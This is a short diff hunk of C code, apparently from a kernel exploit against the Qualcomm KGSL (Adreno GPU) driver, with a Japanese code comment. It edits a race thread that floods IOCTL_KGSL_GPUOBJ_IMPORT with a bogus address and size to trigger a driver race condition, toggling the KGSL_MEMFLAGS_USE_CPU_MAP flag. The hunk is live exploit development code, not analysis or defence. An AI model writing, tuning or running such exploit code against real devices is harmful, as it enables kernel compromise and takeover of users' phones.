@@ -255,14 +255,11 @@ static int submit_ib(int fd, unsigned int ctx_id, uint64_t ib_gpuaddr,
     return ret;
 }
 
-// ----- 修正点: flags を 0 に変更 -----
 static void *race_thread(void *arg) {
     struct kgsl_gpuobj_import_useraddr uaddr = { .virtaddr = BOGUS_ADDR };
     struct kgsl_gpuobj_import imp = {
-        .priv = (uint64_t)&uaddr,
-        .priv_len = BOGUS_SIZE,
-        .flags = 0,                     // KGSL_MEMFLAGS_USE_CPU_MAP を削除
-        .type = KGSL_USER_MEM_TYPE_ADDR,
+        .priv = (uint64_t)&uaddr, .priv_len = BOGUS_SIZE,
+        .flags = KGSL_MEMFLAGS_USE_CPU_MAP, .type = KGSL_USER_MEM_TYPE_ADDR,
     };
     while (!race_done) ioctl(kgsl_fd, IOCTL_KGSL_GPUOBJ_IMPORT, &imp);
     return NULL;
